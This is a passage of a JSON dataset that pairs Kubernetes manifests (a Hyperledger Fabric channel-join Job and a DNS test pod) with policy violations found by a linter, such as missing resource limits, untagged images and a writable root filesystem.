  {
    "id": "01410",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel3\" has cpu request 0"
  },
  {
    "id": "01411",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel4\" has cpu request 0"
  },
  {
    "id": "01412",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel1\" has memory limit 0"
  },
  {
    "id": "01413",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel2\" has memory limit 0"
  },
  {
    "id": "01414",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel3\" has memory limit 0"
  },
  {
    "id": "01415",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel4\" has memory limit 0"
  },
  {
    "id": "01416",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dnstest3\" is using an invalid container image, \"xtoph/dns\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01417",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dnstest3\" does not have a read-only root file system"
  },
  {
    "id": "01418",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dnstest3\" is not set to runAsNonRoot"
  },
  {
    "id": "01419",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
